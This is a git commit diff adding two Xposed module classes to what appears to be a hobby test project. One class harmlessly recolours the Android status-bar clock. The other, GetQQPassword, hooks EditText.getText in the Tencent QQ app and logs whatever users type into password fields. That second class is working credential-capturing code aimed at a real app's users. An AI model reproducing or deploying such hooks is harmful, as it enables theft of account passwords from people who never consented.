80ff046cedd84ac8001c4d4f71f1e18c6c061084
kiya-z <2267161320@qq.com>
2015-12-30 01:18:42 +0800

    move

---
+++ app/src/main/java/space/kiya/xposedtest/ChangeStatusBar.java
@@ -0,0 +1,26 @@
+package space.kiya.xposedtest;
+import android.graphics.Color;
+import android.widget.TextView;
+
+import de.robv.android.xposed.IXposedHookLoadPackage;
+import de.robv.android.xposed.XC_MethodHook;
+import de.robv.android.xposed.callbacks.XC_LoadPackage;
+
+import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
+/**
+ * Created by kiya on 15-12-29.
+ */
+public class ChangeStatusBar implements IXposedHookLoadPackage {
+    @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
+        if(loadPackageParam.packageName.equals("com.android.systemui")){
+            findAndHookMethod("com.android.systemui.statusbar.policy.Clock", loadPackageParam.classLoader, "updateClock", new XC_MethodHook() {
+                @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
+                    TextView tv = (TextView) param.thisObject;
+                    String text = tv.getText().toString();
+                    tv.setText(text + ":)");
+                    tv.setTextColor(Color.RED);
+                }
+            });
+        }
+    }
+}
---
+++ app/src/main/java/space/kiya/xposedtest/GetQQPassword.java
@@ -0,0 +1,32 @@
+package space.kiya.xposedtest;
+import android.widget.EditText;
+
+import de.robv.android.xposed.IXposedHookLoadPackage;
+import de.robv.android.xposed.XC_MethodHook;
+import de.robv.android.xposed.XposedBridge;
+import de.robv.android.xposed.callbacks.XC_LoadPackage;
+
+import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
+/**
+ * Created by kiya on 15-12-29.
+ *
+ */
+public class GetQQPassword implements IXposedHookLoadPackage {
+    @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
+        if (loadPackageParam.packageName.equals("com.tencent.mobileqq")){
+            XposedBridge.log("found qq");
+            findAndHookMethod("android.widget.EditText", loadPackageParam.classLoader, "getText", new XC_MethodHook() {
+                @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
+                    Object v0 = param.thisObject;
+                    if (v0 instanceof EditText){
+                        if (((EditText)v0).getInputType() == 0x81){
+                            if(!param.getResult().toString().equals(""))
+                                XposedBridge.log("found pass:" + param.getResult().toString());
+                        }
+                    }
+                }
+            });
+        }
+
+    }
+}
